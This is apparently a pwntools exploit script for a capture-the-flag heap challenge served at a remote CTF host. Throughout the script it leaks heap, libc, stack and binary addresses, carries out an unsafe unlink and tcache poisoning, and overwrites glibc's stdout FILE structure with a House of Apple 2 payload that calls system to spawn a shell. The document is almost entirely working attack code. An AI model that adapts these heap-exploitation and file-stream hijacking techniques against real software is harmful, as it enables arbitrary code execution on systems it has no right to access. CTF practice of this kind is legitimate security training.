#!/usr/bin/env python3
from pwn import *
from pwncli import IO_FILE_plus_struct

# =========================================================
#                          SETUP
# =========================================================
exe = './limit_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set resolve-heap-via-heuristic force
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/dreamdiary2"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def alloc(idx, size):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendlineafter(b'Size: ', str(size).encode())

def free(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index: ', str(idx).encode())

def show(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.recvuntil(b'Data: ')
    return io.recvline().strip()

def edit(idx, data):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendafter(b'Data: ', data)


def exploit():
    global io
    io = initialize()
    with log.progress("Leaking heap & libc address") as p:
        for i in range(9):
            alloc(i, 0xf8)
        for i in reversed(range(9)):
            free(i) 
        for i in range(7): #Fill the tcache
            alloc(i, 0xf8) 
        alloc(i+1, 0xf8) #Unsorted chunk 1
        alloc(i+2, 0xf8) #Unsorted chunk 2
        libc_leak = u64(show(7).ljust(8, b'\x00'))
        heap = demangle(u64(show(2).ljust(8, b"\x00"))) & ~0xfff # Leak heap
        libc.address = libc_leak - (libc.sym['main_arena'] + 592)
    log.info("Heap base: %#x", heap)
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)

    holder_addr = heap + 0xba0
    victim_chunk_addr = heap + 0x2a0
    fake_fd = holder_addr - 0x18
    fake_bk = holder_addr - 0x10
    log.info("Holder addr: %#x", holder_addr)
    log.info("Victim chunk addr: %#x", victim_chunk_addr)
    log.info("Fake fd: %#x", fake_fd)
    log.info("Fake bk: %#x", fake_bk)

    with log.progress("Unsafe unlink Attack"), context.silent:
        edit(7, p64(0) + p64(0xf0) + p64(fake_fd) + p64(fake_bk) + b'\x00' * 0xd0 + p64(0xf0)) #Fake chunk
        free(9)
        alloc(9, 0xf8) 
        edit(9, p64(victim_chunk_addr)) #Fake chunk pointer idx 9
        for i in range(7): #Fill the tcache
            free(i)
        free(8) #Trigger

    with log.progress("tcache poisoning to heap tcache"), context.silent:
        alloc(0, 0x18)
        alloc(1, 0x18)
        free(1)
        free(0)
        edit(7, p64(0) + p64(0x21) + p64(mangle(heap, heap + 0x90)))
        alloc(1, 0x18)
        alloc(0, 0x18)

    with log.progress("overwrite heap tcache to leak stack"), context.silent:
        free(1)
        edit(0, p64(libc.bss()))
        alloc(2, 0x18)

        stack = u64(show(0).ljust(8, b'\x00')) ^ (libc.bss()) >> 12
        target = stack + 0x338 # Target stack address that contain elf address
    log.info("Stack leak: %#x", stack)
    log.info("Target: %#x", target)

    with log.progress("overwrite heap tcache to leak elf"), context.silent:
        alloc(3, 0x18)
        free(3)
        edit(0, p64(target))
        alloc(4, 0x18)
        elf.address = (u64(show(0).ljust(8, b'\x00')) ^ (target) >> 12) - elf.sym["_start"]
    log.info("Elf base: %#x", elf.address)

    with log.progress("tcache poisoning to array chunk"), context.silent:
        alloc(5, 0x38)
        alloc(6, 0x38)
        free(6)
        free(5)
        edit(7, (p64(0) + p64(0x21) + p64(0)*2)*3 + p64(0) + p64(0x41) + p64(mangle(heap, elf.sym["chunks"]  + 112)))
        pause()
        alloc(5, 0x38)
        alloc(6, 0x38)
        edit(6, p64(libc.sym["_IO_2_1_stdout_"])*2 + b"\xff"*0x20)

    with log.progress("Get shell with stdout"), context.silent:
        payload = IO_FILE_plus_struct().house_of_apple2_execmd_when_do_IO_operation(
            libc.sym['_IO_2_1_stdout_'],
            libc.sym['_IO_wfile_jumps'],
            libc.sym['system'])[:0xff]
        edit(15, payload)
        
    io.interactive()

if __name__ == '__main__':
    exploit()
